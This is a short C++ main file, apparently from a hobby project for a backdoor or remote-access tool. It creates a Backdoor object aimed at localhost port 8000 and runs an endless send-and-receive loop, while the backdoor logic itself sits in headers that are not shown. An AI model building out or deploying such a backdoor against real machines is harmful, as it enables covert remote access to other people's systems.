#include "communication.h"
#include "backdoor.h"
#define IP "127.0.0.1"
#define PORT 8000


int main(int argc, char *argv[]){
    char * s = "Hello world";


    Backdoor b(IP, PORT, true);


    Communication c(IP, PORT);
    bool isalive = true;

    while(true){
        c.listen_forever();
        std::cout << "Connected" << std::endl;

        while(isalive){
            isalive = 1;
            c.send_message(s);
            c.recv_message();
        }
    }

}